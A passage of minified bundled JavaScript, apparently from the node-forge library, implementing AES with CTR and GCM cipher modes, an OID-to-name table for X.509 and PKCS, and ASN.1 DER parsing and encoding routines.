c=s.length();if(s.length()===0)return!0;if(this.cipher.encrypt(this._inBlock,this._outBlock),this._partialBytes===0&&c>=this.blockSize){for(var l=0;l<this._ints;++l)o.putInt32(s.getInt32()^this._outBlock[l]),this._inBlock[l]=this._outBlock[l];return}var u=(this.blockSize-c)%this.blockSize;u>0&&(u=this.blockSize-u),this._partialOutput.clear();for(var l=0;l<this._ints;++l)this._partialOutput.putInt32(s.getInt32()^this._outBlock[l]);if(u>0)s.read-=this.blockSize;else for(var l=0;l<this._ints;++l)this._inBlock[l]=this._outBlock[l];if(this._partialBytes>0&&this._partialOutput.getBytes(this._partialBytes),u>0&&!a)return o.putBytes(this._partialOutput.getBytes(u-this._partialBytes)),this._partialBytes=u,!0;o.putBytes(this._partialOutput.getBytes(c-this._partialBytes)),this._partialBytes=0},e.ofb.prototype.decrypt=e.ofb.prototype.encrypt,e.ctr=function(s){s=s||{},this.name="CTR",this.cipher=s.cipher,this.blockSize=s.blockSize||16,this._ints=this.blockSize/4,this._inBlock=null,this._outBlock=new Array(this._ints),this._partialOutput=r.util.createBuffer(),this._partialBytes=0},e.ctr.prototype.start=function(s){if(!("iv"in s))throw new Error("Invalid IV parameter.");this._iv=t(s.iv,this.blockSize),this._inBlock=this._iv.slice(0),this._partialBytes=0},e.ctr.prototype.encrypt=function(s,o,a){var c=s.length();if(c===0)return!0;if(this.cipher.encrypt(this._inBlock,this._outBlock),this._partialBytes===0&&c>=this.blockSize)for(var l=0;l<this._ints;++l)o.putInt32(s.getInt32()^this._outBlock[l]);else{var u=(this.blockSize-c)%this.blockSize;u>0&&(u=this.blockSize-u),this._partialOutput.clear();for(var l=0;l<this._ints;++l)this._partialOutput.putInt32(s.getInt32()^this._outBlock[l]);if(u>0&&(s.read-=this.blockSize),this._partialBytes>0&&this._partialOutput.getBytes(this._partialBytes),u>0&&!a)return o.putBytes(this._partialOutput.getBytes(u-this._partialBytes)),this._partialBytes=u,!0;o.putBytes(this._partialOutput.getBytes(c-this._partialBytes)),this._partialBytes=0}i(this._inBlock)},e.ctr.prototype.decrypt=e.ctr.prototype.encrypt,e.gcm=function(s){s=s||{},this.name="GCM",this.cipher=s.cipher,this.blockSize=s.blockSize||16,this._ints=this.blockSize/4,this._inBlock=new Array(this._ints),this._outBlock=new Array(this._ints),this._partialOutput=r.util.createBuffer(),this._partialBytes=0,this._R=3774873600},e.gcm.prototype.start=function(s){if(!("iv"in s))throw new Error("Invalid IV parameter.");var o=r.util.createBuffer(s.iv);this._cipherLength=0;var a;if("additionalData"in s?a=r.util.createBuffer(s.additionalData):a=r.util.createBuffer(),"tagLength"in s?this._tagLength=s.tagLength:this._tagLength=128,this._tag=null,s.decrypt&&(this._tag=r.util.createBuffer(s.tag).getBytes(),this._tag.length!==this._tagLength/8))throw new Error("Authentication tag does not match tag length.");this._hashBlock=new Array(this._ints),this.tag=null,this._hashSubkey=new Array(this._ints),this.cipher.encrypt([0,0,0,0],this._hashSubkey),this.componentBits=4,this._m=this.generateHashTable(this._hashSubkey,this.componentBits);var c=o.length();if(c===12)this._j0=[o.getInt32(),o.getInt32(),o.getInt32(),1];else{for(this._j0=[0,0,0,0];o.length()>0;)this._j0=this.ghash(this._hashSubkey,this._j0,[o.getInt32(),o.getInt32(),o.getInt32(),o.getInt32()]);this._j0=this.ghash(this._hashSubkey,this._j0,[0,0].concat(n(c*8)))}this._inBlock=this._j0.slice(0),i(this._inBlock),this._partialBytes=0,a=r.util.createBuffer(a),this._aDataLength=n(a.length()*8);var l=a.length()%this.blockSize;for(l&&a.fillWithByte(0,this.blockSize-l),this._s=[0,0,0,0];a.length()>0;)this._s=this.ghash(this._hashSubkey,this._s,[a.getInt32(),a.getInt32(),a.getInt32(),a.getInt32()])},e.gcm.prototype.encrypt=function(s,o,a){var c=s.length();if(c===0)return!0;if(this.cipher.encrypt(this._inBlock,this._outBlock),this._partialBytes===0&&c>=this.blockSize){for(var l=0;l<this._ints;++l)o.putInt32(this._outBlock[l]^=s.getInt32());this._cipherLength+=this.blockSize}else{var u=(this.blockSize-c)%this.blockSize;u>0&&(u=this.blockSize-u),this._partialOutput.clear();for(var l=0;l<this._ints;++l)this._partialOutput.putInt32(s.getInt32()^this._outBlock[l]);if(u<=0||a){if(a){var d=c%this.blockSize;this._cipherLength+=d,this._partialOutput.truncate(this.blockSize-d)}else this._cipherLength+=this.blockSize;for(var l=0;l<this._ints;++l)this._outBlock[l]=this._partialOutput.getInt32();this._partialOutput.read-=this.blockSize}if(this._partialBytes>0&&this._partialOutput.getBytes(this._partialBytes),u>0&&!a)return s.read-=this.blockSize,o.putBytes(this._partialOutput.getBytes(u-this._partialBytes)),this._partialBytes=u,!0;o.putBytes(this._partialOutput.getBytes(c-this._partialBytes)),this._partialBytes=0}this._s=this.ghash(this._hashSubkey,this._s,this._outBlock),i(this._inBlock)},e.gcm.prototype.decrypt=function(s,o,a){var c=s.length();if(c<this.blockSize&&!(a&&c>0))return!0;this.cipher.encrypt(this._inBlock,this._outBlock),i(this._inBlock),this._hashBlock[0]=s.getInt32(),this._hashBlock[1]=s.getInt32(),this._hashBlock[2]=s.getInt32(),this._hashBlock[3]=s.getInt32(),this._s=this.ghash(this._hashSubkey,this._s,this._hashBlock);for(var l=0;l<this._ints;++l)o.putInt32(this._outBlock[l]^this._hashBlock[l]);c<this.blockSize?this._cipherLength+=c%this.blockSize:this._cipherLength+=this.blockSize},e.gcm.prototype.afterFinish=function(s,o){var a=!0;o.decrypt&&o.overflow&&s.truncate(this.blockSize-o.overflow),this.tag=r.util.createBuffer();var c=this._aDataLength.concat(n(this._cipherLength*8));this._s=this.ghash(this._hashSubkey,this._s,c);var l=[];this.cipher.encrypt(this._j0,l);for(var u=0;u<this._ints;++u)this.tag.putInt32(this._s[u]^l[u]);return this.tag.truncate(this.tag.length()%(this._tagLength/8)),o.decrypt&&this.tag.bytes()!==this._tag&&(a=!1),a},e.gcm.prototype.multiply=function(s,o){for(var a=[0,0,0,0],c=o.slice(0),l=0;l<128;++l){var u=s[l/32|0]&1<<31-l%32;u&&(a[0]^=c[0],a[1]^=c[1],a[2]^=c[2],a[3]^=c[3]),this.pow(c,c)}return a},e.gcm.prototype.pow=function(s,o){for(var a=s[3]&1,c=3;c>0;--c)o[c]=s[c]>>>1|(s[c-1]&1)<<31;o[0]=s[0]>>>1,a&&(o[0]^=this._R)},e.gcm.prototype.tableMultiply=function(s){for(var o=[0,0,0,0],a=0;a<32;++a){var c=a/8|0,l=s[c]>>>(7-a%8)*4&15,u=this._m[a][l];o[0]^=u[0],o[1]^=u[1],o[2]^=u[2],o[3]^=u[3]}return o},e.gcm.prototype.ghash=function(s,o,a){return o[0]^=a[0],o[1]^=a[1],o[2]^=a[2],o[3]^=a[3],this.tableMultiply(o)},e.gcm.prototype.generateHashTable=function(s,o){for(var a=8/o,c=4*a,l=16*a,u=new Array(l),d=0;d<l;++d){var h=[0,0,0,0],f=d/c|0,p=(c-1-d%c)*o;h[f]=1<<o-1<<p,u[d]=this.generateSubHashTable(this.multiply(h,s),o)}return u},e.gcm.prototype.generateSubHashTable=function(s,o){var a=1<<o,c=a>>>1,l=new Array(a);l[c]=s.slice(0);for(var u=c>>>1;u>0;)this.pow(l[2*u],l[u]=[]),u>>=1;for(u=2;u<c;){for(var d=1;d<u;++d){var h=l[u],f=l[d];l[u+d]=[h[0]^f[0],h[1]^f[1],h[2]^f[2],h[3]^f[3]]}u*=2}for(l[0]=[0,0,0,0],u=c+1;u<a;++u){var p=l[u^c];l[u]=[s[0]^p[0],s[1]^p[1],s[2]^p[2],s[3]^p[3]]}return l};function t(s,o){if(typeof s=="string"&&(s=r.util.createBuffer(s)),r.util.isArray(s)&&s.length>4){var a=s;s=r.util.createBuffer();for(var c=0;c<a.length;++c)s.putByte(a[c])}if(s.length()<o)throw new Error("Invalid IV length; got "+s.length()+" bytes and expected "+o+" bytes.");if(!r.util.isArray(s)){for(var l=[],u=o/4,c=0;c<u;++c)l.push(s.getInt32());s=l}return s}function i(s){s[s.length-1]=s[s.length-1]+1&4294967295}function n(s){return[s/4294967296|0,s&4294967295]}return w_.exports}var b_,AD;function Xg(){if(AD)return b_;AD=1;var r=Lr();q$(),dJ(),Ei(),b_=r.aes=r.aes||{},r.aes.startEncrypting=function(f,p,g,w){var m=h({key:f,output:g,decrypt:!1,mode:w});return m.start(p),m},r.aes.createEncryptionCipher=function(f,p){return h({key:f,output:null,decrypt:!1,mode:p})},r.aes.startDecrypting=function(f,p,g,w){var m=h({key:f,output:g,decrypt:!0,mode:w});return m.start(p),m},r.aes.createDecryptionCipher=function(f,p){return h({key:f,output:null,decrypt:!0,mode:p})},r.aes.Algorithm=function(f,p){t||l();var g=this;g.name=f,g.mode=new p({blockSize:16,cipher:{encrypt:function(w,m){return d(g._w,w,m,!1)},decrypt:function(w,m){return d(g._w,w,m,!0)}}}),g._init=!1},r.aes.Algorithm.prototype.initialize=function(f){if(!this._init){var p=f.key,g;if(typeof p=="string"&&(p.length===16||p.length===24||p.length===32))p=r.util.createBuffer(p);else if(r.util.isArray(p)&&(p.length===16||p.length===24||p.length===32)){g=p,p=r.util.createBuffer();for(var w=0;w<g.length;++w)p.putByte(g[w])}if(!r.util.isArray(p)){g=p,p=[];var m=g.length();if(m===16||m===24||m===32){m=m>>>2;for(var w=0;w<m;++w)p.push(g.getInt32())}}if(!r.util.isArray(p)||!(p.length===4||p.length===6||p.length===8))throw new Error("Invalid key parameter.");var x=this.mode.name,S=["CFB","OFB","CTR","GCM"].indexOf(x)!==-1;this._w=u(p,f.decrypt&&!S),this._init=!0}},r.aes._expandKey=function(f,p){return t||l(),u(f,p)},r.aes._updateBlock=d,e("AES-ECB",r.cipher.modes.ecb),e("AES-CBC",r.cipher.modes.cbc),e("AES-CFB",r.cipher.modes.cfb),e("AES-OFB",r.cipher.modes.ofb),e("AES-CTR",r.cipher.modes.ctr),e("AES-GCM",r.cipher.modes.gcm);function e(f,p){var g=function(){return new r.aes.Algorithm(f,p)};r.cipher.registerAlgorithm(f,g)}var t=!1,i=4,n,s,o,a,c;function l(){t=!0,o=[0,1,2,4,8,16,32,64,128,27,54];for(var f=new Array(256),p=0;p<128;++p)f[p]=p<<1,f[p+128]=p+128<<1^283;n=new Array(256),s=new Array(256),a=new Array(4),c=new Array(4);for(var p=0;p<4;++p)a[p]=new Array(256),c[p]=new Array(256);for(var g=0,w=0,m,x,S,T,k,I,E,p=0;p<256;++p){T=w^w<<1^w<<2^w<<3^w<<4,T=T>>8^T&255^99,n[g]=T,s[T]=g,k=f[T],m=f[g],x=f[m],S=f[x],I=k<<24^T<<16^T<<8^(T^k),E=(m^x^S)<<24^(g^S)<<16^(g^x^S)<<8^(g^m^S);for(var C=0;C<4;++C)a[C][g]=I,c[C][T]=E,I=I<<24|I>>>8,E=E<<24|E>>>8;g===0?g=w=1:(g=m^f[f[f[m^S]]],w^=f[f[w]])}}function u(f,p){for(var g=f.slice(0),w,m=1,x=g.length,S=x+6+1,T=i*S,k=x;k<T;++k)w=g[k-1],k%x===0?(w=n[w>>>16&255]<<24^n[w>>>8&255]<<16^n[w&255]<<8^n[w>>>24]^o[m]<<24,m++):x>6&&k%x===4&&(w=n[w>>>24]<<24^n[w>>>16&255]<<16^n[w>>>8&255]<<8^n[w&255]),g[k]=g[k-x]^w;if(p){var I,E=c[0],C=c[1],N=c[2],L=c[3],$=g.slice(0);T=g.length;for(var k=0,y=T-i;k<T;k+=i,y-=i)if(k===0||k===T-i)$[k]=g[y],$[k+1]=g[y+3],$[k+2]=g[y+2],$[k+3]=g[y+1];else for(var A=0;A<i;++A)I=g[y+A],$[k+(3&-A)]=E[n[I>>>24]]^C[n[I>>>16&255]]^N[n[I>>>8&255]]^L[n[I&255]];g=$}return g}function d(f,p,g,w){var m=f.length/4-1,x,S,T,k,I;w?(x=c[0],S=c[1],T=c[2],k=c[3],I=s):(x=a[0],S=a[1],T=a[2],k=a[3],I=n);var E,C,N,L,$,y,A;E=p[0]^f[0],C=p[w?3:1]^f[1],N=p[2]^f[2],L=p[w?1:3]^f[3];for(var b=3,v=1;v<m;++v)$=x[E>>>24]^S[C>>>16&255]^T[N>>>8&255]^k[L&255]^f[++b],y=x[C>>>24]^S[N>>>16&255]^T[L>>>8&255]^k[E&255]^f[++b],A=x[N>>>24]^S[L>>>16&255]^T[E>>>8&255]^k[C&255]^f[++b],L=x[L>>>24]^S[E>>>16&255]^T[C>>>8&255]^k[N&255]^f[++b],E=$,C=y,N=A;g[0]=I[E>>>24]<<24^I[C>>>16&255]<<16^I[N>>>8&255]<<8^I[L&255]^f[++b],g[w?3:1]=I[C>>>24]<<24^I[N>>>16&255]<<16^I[L>>>8&255]<<8^I[E&255]^f[++b],g[2]=I[N>>>24]<<24^I[L>>>16&255]<<16^I[E>>>8&255]<<8^I[C&255]^f[++b],g[w?1:3]=I[L>>>24]<<24^I[E>>>16&255]<<16^I[C>>>8&255]<<8^I[N&255]^f[++b]}function h(f){f=f||{};var p=(f.mode||"CBC").toUpperCase(),g="AES-"+p,w;f.decrypt?w=r.cipher.createDecipher(g,f.key):w=r.cipher.createCipher(g,f.key);var m=w.start;return w.start=function(x,S){var T=null;S instanceof r.util.ByteBuffer&&(T=S,S={}),S=S||{},S.output=T,S.iv=x,m.call(w,S)},w}return b_}var v_={exports:{}},y_={exports:{}},x_={exports:{}},ID;function e2(){if(ID)return x_.exports;ID=1;var r=Lr();r.pki=r.pki||{};var e=x_.exports=r.pki.oids=r.oids=r.oids||{};function t(n,s){e[n]=s,e[s]=n}function i(n,s){e[n]=s}return t("1.2.840.113549.1.1.1","rsaEncryption"),t("1.2.840.113549.1.1.4","md5WithRSAEncryption"),t("1.2.840.113549.1.1.5","sha1WithRSAEncryption"),t("1.2.840.113549.1.1.7","RSAES-OAEP"),t("1.2.840.113549.1.1.8","mgf1"),t("1.2.840.113549.1.1.9","pSpecified"),t("1.2.840.113549.1.1.10","RSASSA-PSS"),t("1.2.840.113549.1.1.11","sha256WithRSAEncryption"),t("1.2.840.113549.1.1.12","sha384WithRSAEncryption"),t("1.2.840.113549.1.1.13","sha512WithRSAEncryption"),t("1.3.101.112","EdDSA25519"),t("1.2.840.10040.4.3","dsa-with-sha1"),t("1.3.14.3.2.7","desCBC"),t("1.3.14.3.2.26","sha1"),t("1.3.14.3.2.29","sha1WithRSASignature"),t("2.16.840.1.101.3.4.2.1","sha256"),t("2.16.840.1.101.3.4.2.2","sha384"),t("2.16.840.1.101.3.4.2.3","sha512"),t("2.16.840.1.101.3.4.2.4","sha224"),t("2.16.840.1.101.3.4.2.5","sha512-224"),t("2.16.840.1.101.3.4.2.6","sha512-256"),t("1.2.840.113549.2.2","md2"),t("1.2.840.113549.2.5","md5"),t("1.2.840.113549.1.7.1","data"),t("1.2.840.113549.1.7.2","signedData"),t("1.2.840.113549.1.7.3","envelopedData"),t("1.2.840.113549.1.7.4","signedAndEnvelopedData"),t("1.2.840.113549.1.7.5","digestedData"),t("1.2.840.113549.1.7.6","encryptedData"),t("1.2.840.113549.1.9.1","emailAddress"),t("1.2.840.113549.1.9.2","unstructuredName"),t("1.2.840.113549.1.9.3","contentType"),t("1.2.840.113549.1.9.4","messageDigest"),t("1.2.840.113549.1.9.5","signingTime"),t("1.2.840.113549.1.9.6","counterSignature"),t("1.2.840.113549.1.9.7","challengePassword"),t("1.2.840.113549.1.9.8","unstructuredAddress"),t("1.2.840.113549.1.9.14","extensionRequest"),t("1.2.840.113549.1.9.20","friendlyName"),t("1.2.840.113549.1.9.21","localKeyId"),t("1.2.840.113549.1.9.22.1","x509Certificate"),t("1.2.840.113549.1.12.10.1.1","keyBag"),t("1.2.840.113549.1.12.10.1.2","pkcs8ShroudedKeyBag"),t("1.2.840.113549.1.12.10.1.3","certBag"),t("1.2.840.113549.1.12.10.1.4","crlBag"),t("1.2.840.113549.1.12.10.1.5","secretBag"),t("1.2.840.113549.1.12.10.1.6","safeContentsBag"),t("1.2.840.113549.1.5.13","pkcs5PBES2"),t("1.2.840.113549.1.5.12","pkcs5PBKDF2"),t("1.2.840.113549.1.12.1.1","pbeWithSHAAnd128BitRC4"),t("1.2.840.113549.1.12.1.2","pbeWithSHAAnd40BitRC4"),t("1.2.840.113549.1.12.1.3","pbeWithSHAAnd3-KeyTripleDES-CBC"),t("1.2.840.113549.1.12.1.4","pbeWithSHAAnd2-KeyTripleDES-CBC"),t("1.2.840.113549.1.12.1.5","pbeWithSHAAnd128BitRC2-CBC"),t("1.2.840.113549.1.12.1.6","pbewithSHAAnd40BitRC2-CBC"),t("1.2.840.113549.2.7","hmacWithSHA1"),t("1.2.840.113549.2.8","hmacWithSHA224"),t("1.2.840.113549.2.9","hmacWithSHA256"),t("1.2.840.113549.2.10","hmacWithSHA384"),t("1.2.840.113549.2.11","hmacWithSHA512"),t("1.2.840.113549.3.7","des-EDE3-CBC"),t("2.16.840.1.101.3.4.1.2","aes128-CBC"),t("2.16.840.1.101.3.4.1.22","aes192-CBC"),t("2.16.840.1.101.3.4.1.42","aes256-CBC"),t("2.5.4.3","commonName"),t("2.5.4.4","surname"),t("2.5.4.5","serialNumber"),t("2.5.4.6","countryName"),t("2.5.4.7","localityName"),t("2.5.4.8","stateOrProvinceName"),t("2.5.4.9","streetAddress"),t("2.5.4.10","organizationName"),t("2.5.4.11","organizationalUnitName"),t("2.5.4.12","title"),t("2.5.4.13","description"),t("2.5.4.15","businessCategory"),t("2.5.4.17","postalCode"),t("2.5.4.42","givenName"),t("1.3.6.1.4.1.311.60.2.1.2","jurisdictionOfIncorporationStateOrProvinceName"),t("1.3.6.1.4.1.311.60.2.1.3","jurisdictionOfIncorporationCountryName"),t("2.16.840.1.113730.1.1","nsCertType"),t("2.16.840.1.113730.1.13","nsComment"),i("2.5.29.1","authorityKeyIdentifier"),i("2.5.29.2","keyAttributes"),i("2.5.29.3","certificatePolicies"),i("2.5.29.4","keyUsageRestriction"),i("2.5.29.5","policyMapping"),i("2.5.29.6","subtreesConstraint"),i("2.5.29.7","subjectAltName"),i("2.5.29.8","issuerAltName"),i("2.5.29.9","subjectDirectoryAttributes"),i("2.5.29.10","basicConstraints"),i("2.5.29.11","nameConstraints"),i("2.5.29.12","policyConstraints"),i("2.5.29.13","basicConstraints"),t("2.5.29.14","subjectKeyIdentifier"),t("2.5.29.15","keyUsage"),i("2.5.29.16","privateKeyUsagePeriod"),t("2.5.29.17","subjectAltName"),t("2.5.29.18","issuerAltName"),t("2.5.29.19","basicConstraints"),i("2.5.29.20","cRLNumber"),i("2.5.29.21","cRLReason"),i("2.5.29.22","expirationDate"),i("2.5.29.23","instructionCode"),i("2.5.29.24","invalidityDate"),i("2.5.29.25","cRLDistributionPoints"),i("2.5.29.26","issuingDistributionPoint"),i("2.5.29.27","deltaCRLIndicator"),i("2.5.29.28","issuingDistributionPoint"),i("2.5.29.29","certificateIssuer"),i("2.5.29.30","nameConstraints"),t("2.5.29.31","cRLDistributionPoints"),t("2.5.29.32","certificatePolicies"),i("2.5.29.33","policyMappings"),i("2.5.29.34","policyConstraints"),t("2.5.29.35","authorityKeyIdentifier"),i("2.5.29.36","policyConstraints"),t("2.5.29.37","extKeyUsage"),i("2.5.29.46","freshestCRL"),i("2.5.29.54","inhibitAnyPolicy"),t("1.3.6.1.4.1.11129.2.4.2","timestampList"),t("1.3.6.1.5.5.7.1.1","authorityInfoAccess"),t("1.3.6.1.5.5.7.3.1","serverAuth"),t("1.3.6.1.5.5.7.3.2","clientAuth"),t("1.3.6.1.5.5.7.3.3","codeSigning"),t("1.3.6.1.5.5.7.3.4","emailProtection"),t("1.3.6.1.5.5.7.3.8","timeStamping"),x_.exports}var TD;function Yd(){if(TD)return y_.exports;TD=1;var r=Lr();Ei(),e2();var e=y_.exports=r.asn1=r.asn1||{};e.Class={UNIVERSAL:0,APPLICATION:64,CONTEXT_SPECIFIC:128,PRIVATE:192},e.Type={NONE:0,BOOLEAN:1,INTEGER:2,BITSTRING:3,OCTETSTRING:4,NULL:5,OID:6,ODESC:7,EXTERNAL:8,REAL:9,ENUMERATED:10,EMBEDDED:11,UTF8:12,ROID:13,SEQUENCE:16,SET:17,PRINTABLESTRING:19,IA5STRING:22,UTCTIME:23,GENERALIZEDTIME:24,BMPSTRING:30},e.create=function(o,a,c,l,u){if(r.util.isArray(l)){for(var d=[],h=0;h<l.length;++h)l[h]!==void 0&&d.push(l[h]);l=d}var f={tagClass:o,type:a,constructed:c,composed:c||r.util.isArray(l),value:l};return u&&"bitStringContents"in u&&(f.bitStringContents=u.bitStringContents,f.original=e.copy(f)),f},e.copy=function(o,a){var c;if(r.util.isArray(o)){c=[];for(var l=0;l<o.length;++l)c.push(e.copy(o[l],a));return c}return typeof o=="string"?o:(c={tagClass:o.tagClass,type:o.type,constructed:o.constructed,composed:o.composed,value:e.copy(o.value,a)},a&&!a.excludeBitStringContents&&(c.bitStringContents=o.bitStringContents),c)},e.equals=function(o,a,c){if(r.util.isArray(o)){if(!r.util.isArray(a)||o.length!==a.length)return!1;for(var l=0;l<o.length;++l)if(!e.equals(o[l],a[l]))return!1;return!0}if(typeof o!=typeof a)return!1;if(typeof o=="string")return o===a;var u=o.tagClass===a.tagClass&&o.type===a.type&&o.constructed===a.constructed&&o.composed===a.composed&&e.equals(o.value,a.value);return c&&c.includeBitStringContents&&(u=u&&o.bitStringContents===a.bitStringContents),u},e.getBerValueLength=function(o){var a=o.getByte();if(a!==128){var c,l=a&128;return l?c=o.getInt((a&127)<<3):c=a,c}};function t(o,a,c){if(c>a){var l=new Error("Too few bytes to parse DER.");throw l.available=o.length(),l.remaining=a,l.requested=c,l}}var i=function(o,a){var c=o.getByte();if(a--,c!==128){var l,u=c&128;if(!u)l=c;else{var d=c&127;t(o,a,d),l=o.getInt(d<<3)}if(l<0)throw new Error("Negative length: "+l);return l}};e.fromDer=function(o,a){a===void 0&&(a={strict:!0,parseAllBytes:!0,decodeBitStrings:!0}),typeof a=="boolean"&&(a={strict:a,parseAllBytes:!0,decodeBitStrings:!0}),"strict"in a||(a.strict=!0),"parseAllBytes"in a||(a.parseAllBytes=!0),"decodeBitStrings"in a||(a.decodeBitStrings=!0),typeof o=="string"&&(o=r.util.createBuffer(o));var c=o.length(),l=n(o,o.length(),0,a);if(a.parseAllBytes&&o.length()!==0){var u=new Error("Unparsed DER bytes remain after ASN.1 parsing.");throw u.byteCount=c,u.remaining=o.length(),u}return l};function n(o,a,c,l){var u;t(o,a,2);var d=o.getByte();a--;var h=d&192,f=d&31;u=o.length();var p=i(o,a);if(a-=u-o.length(),p!==void 0&&p>a){if(l.strict){var g=new Error("Too few bytes to read ASN.1 value.");throw g.available=o.length(),g.remaining=a,g.requested=p,g}p=a}var w,m,x=(d&32)===32;if(x)if(w=[],p===void 0)for(;;){if(t(o,a,2),o.bytes(2)==="\0\0"){o.getBytes(2),a-=2;break}u=o.length(),w.push(n(o,a,c+1,l)),a-=u-o.length()}else for(;p>0;)u=o.length(),w.push(n(o,p,c+1,l)),a-=u-o.length(),p-=u-o.length();if(w===void 0&&h===e.Class.UNIVERSAL&&f===e.Type.BITSTRING&&(m=o.bytes(p)),w===void 0&&l.decodeBitStrings&&h===e.Class.UNIVERSAL&&f===e.Type.BITSTRING&&p>1){var S=o.read,T=a,k=0;if(f===e.Type.BITSTRING&&(t(o,a,1),k=o.getByte(),a--),k===0)try{u=o.length();var I={strict:!0,decodeBitStrings:!0},E=n(o,a,c+1,I),C=u-o.length();a-=C,f==e.Type.BITSTRING&&C++;var N=E.tagClass;C===p&&(N===e.Class.UNIVERSAL||N===e.Class.CONTEXT_SPECIFIC)&&(w=[E])}catch{}w===void 0&&(o.read=S,a=T)}if(w===void 0){if(p===void 0){if(l.strict)throw new Error("Non-constructed ASN.1 object of indefinite length.");p=a}if(f===e.Type.BMPSTRING)for(w="";p>0;p-=2)t(o,a,2),w+=String.fromCharCode(o.getInt16()),a-=2;else w=o.getBytes(p),a-=p}var L=m===void 0?null:{bitStringContents:m};return e.create(h,f,x,w,L)}e.toDer=function(o){var a=r.util.createBuffer(),c=o.tagClass|o.type,l=r.util.createBuffer(),u=!1;if("bitStringContents"in o&&(u=!0,o.original&&(u=e.equals(o,o.original))),u)l.putBytes(o.bitStringContents);else if(o.composed){o.constructed?c|=32:l.putByte(0);for(var d=0;d<o.value.length;++d)o.value[d]!==void 0&&l.putBuffer(e.toDer(o.value[d]))}else if(o.type===e.Type.BMPSTRING)for(var d=0;d<o.value.length;++d)l.putInt16(o.value.charCodeAt(d));else o.type===e.Type.INTEGER&&o.value.length>1&&(o.value.charCodeAt(0)===0&&(o.value.charCodeAt(1)&128)===0||o.value.charCodeAt(0)===255&&(o.value.charCodeAt(1)&128)===128)?l.putBytes(o.value.substr(1)):l.putBytes(o.value);if(a.putByte(c),l.length()<=127)a.putByte(l.length()&127);else{var h=l.length(),f="";do f+=String.fromCharCode(h&255),h=h>>>8;while(h>0);a.putByte(f.length|128);for(var d=f.length-1;d>=0;--d)a.putByte(f.charCodeAt(d))}return a.putBuffer(l),a},e.oidToDer=function(o){var a=o.split("."),c=r.util.createBuffer();c.putByte(40*parseInt(a[0],10)+parseInt(a[1],10));for(var l,u,d,h,f=2;f<a.length;++f){l=!0,u=[],d=parseInt(a[f],10);do h=d&127,d=d>>>7,l||(h|=128),u.push(h),l=!1;while(d>0);for(var p=u.length-1;p>=0;--p)c.putByte(u[p])}return c},e.derToOid=function(o){var a;typeof o=="string"&&(o=r.util.createBuffer(o));var c=o.getByte();a=Math.floor(c/40)+"."+c%40;for(var l=0;o.length()>0;)c=o.getByte(),l=l<<7,c&128?l+=c&127:(a+="."+(l+c),l=0);return a},e.utcTimeToDate=function(o){var a=new Date,c=parseInt(o.substr(0,2),10);c=c>=50?1900+c:2e3+c;var l=parseInt(o.substr(2,2),10)-1,u=parseInt(o.substr(4,2),10),d=parseInt(o.substr(6,2),10),h=parseInt(o.substr(8,2),10),f=0;if(o.length>11){var p=o.charAt(10),g=10;p!=="+"&&p!=="-"&&(f=parseInt(o.substr(10,2),10),g+=2)}if(a.setUTCFullYear(c,l,u),a.setUTCHours(d,h,f,0),g&&(p=o.charAt(g),p==="+"||p==="-")){var w=parseInt(o.substr(g+1,2),10),m=parseInt(o.substr(g+4,2),10),x=w*60+m;x*=6e4,p==="+"?a.setTime(+a-x):a.setTime(+a+x)}return a},e.generalizedTimeToDate=function(o){var a=new Date,c=parseInt(o.substr(0,4),10),l=parseInt(o.substr(4,2),10)-1,u=parseInt(o.substr(6,2),10),d=parseInt(o.substr(8,2),10),h=parseInt(o.substr(10,2),10),f=parseInt(o.substr(12,2),10),p=0,g=0,w=!1;o.charAt(o.length-1)==="Z"&&(w=!0);var m=o.length-5,x=o.charAt(m);if(x==="+"||x==="-"){var S=parseInt(o.substr(m+1,2),10),T=parseInt(o.substr(m+4,2),10);g=S*60+T,g*=6e4,x==="+"&&(g*=-1),w=!0}return o.charAt(14)==="."&&(p=parseFloat(o.substr(14),10)*1e3),w?(a.setUTCFullYear(c,l,u),a.setUTCHours(d,h,f,p),a.setTime(+a+g)):(a.setFullYear(c,l,u),a.setHours(d,h,f,p)),a},e.dateToUtcTime=function(o){if(typeof o=="string")return o;var a="",c=[];c.push((""+o.getUTCFullYear()).substr(2)),c.push(""+(o.getUTCMonth()+1)),c.push(""+o.getUTCDate()),c.push(""+o.getUTCHours()),c.push(""+o.getUTCMinutes()),c.push(""+o.getUTCSeconds());for(var l=0;l<c.length;++l)c[l].length<2&&(a+="0"),a+=c[l];return a+="Z",a},e.dateToGeneralizedTime=function(o){if(typeof o=="string")return o;var a="",c=[];c.push(""+o.getUTCFullYear()),c.push(""+(o.getUTCMonth()+1)),c.push(""+o.getUTCDate()),c.push(""+o.getUTCHours()),c.push(""+o.getUTCMinutes()),c.push(""+o.getUTCSeconds());for(var l=0;l<c.length;++l)c[l].length<2&&(a+="0"),a+=c[l];return a+="Z",a},e.integerToDer=function(o){var a=r.util.createBuffer();if(o>=-128&&o<128)return a.putSignedInt(o,8);if(o>=-32768&&o<32768)return a.putSignedInt(o,16);if(o>=-8388608&&o<8388608)return a.putSignedInt(o,24);if(o>=-2147483648&&o<2147483648)return a.putSignedInt(o,32);var c=new Error("Integer too large; max is 32-bits.");throw c.integer=o,c},e.derToInteger=function(o){typeof o=="string"&&(o=r.util.createBuffer(o));var a=o.length()*8;if(a>32)throw new Error("Integer too large; max is 32-bits.");return o.getSignedInt(a)},e.validate=function(o,a,c,l){var u=!1;if((o.tagClass===a.tagClass||typeof a.tagClass>"u")&&(o.type===a.type||typeof a.type>"u"))if(o.constructed===a.constructed||typeof a.constructed>"u"){if(u=!0,a.value&&r.util.isArray(a.value))for(var d=0,h=0;u&&h<a.value.length;++h)u=a.value[h].optional||!1,o.value[d]&&(u=e.validate(o.value[d],a.value[h],c,l),u?++d:a.value[h].optional&&(u=!0)),!u&&l&&l.push("["+a.name+'] Tag class "'+a.tagClass+'", type "'+a.type+'" expected value length "'+a.value.length+'", got "'+o.value.length+'"');if(u&&c&&(a.capture&&(c[a.capture]=o.value),a.captureAsn1&&(c[a.captureAsn1]=o),a.captureBitStringContents&&"bitStringContents"in o&&(c[a.captureBitStringContents]=o.bitStringContents),a.captureBitStringValue&&"bitStringContents"in o))if(o.bitStringContents.length<2)c[a.captureBitStringValue]="";else{var f=o.bitStringContents.charCodeAt(0);if(f!==0)throw new Error("captureBitStringValue only supported for zero unused bits");c[a.captureBitStringValue]=o.bitStringContents.slice(1)}}else l&&l.push("["+a.name+'] Expected constructed "'+a.constructed+'", got "'+o.constructed+'"');else l&&(o.tagClass!==a.tagClass&&l.push("["+a.name+'] Expected tag class "'+a.tagClass+'", got 